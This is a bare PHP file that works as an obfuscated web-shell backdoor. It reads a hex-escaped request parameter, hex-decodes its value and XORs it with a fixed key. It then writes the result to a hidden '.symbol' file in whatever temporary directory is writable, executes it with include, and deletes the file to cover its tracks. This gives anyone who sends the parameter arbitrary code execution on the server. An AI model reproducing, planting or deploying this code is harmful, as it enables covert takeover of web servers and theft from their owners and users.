<?php

if(array_key_exists("\x65\x6Et", $_REQUEST)){
	$resource = hex2bin($_REQUEST["\x65\x6Et"]);
	$token     =      ''      ;      $x = 0; while($x < strlen($resource)){$token .= chr(ord($resource[$x]) ^ 94);$x++;}
	$rec = array_filter(["/dev/shm", getcwd(), ini_get("upload_tmp_dir"), "/tmp", sys_get_temp_dir(), "/var/tmp", session_save_path(), getenv("TMP"), getenv("TEMP")]);
	foreach ($rec as $key => $ent) {
    		if ((function($d) { return is_dir($d) && is_writable($d); })($ent)) {
    $factor = "$ent/.symbol";
    if (file_put_contents($factor, $token)) {
	include $factor;
	@unlink($factor);
	die();
}
}
}
}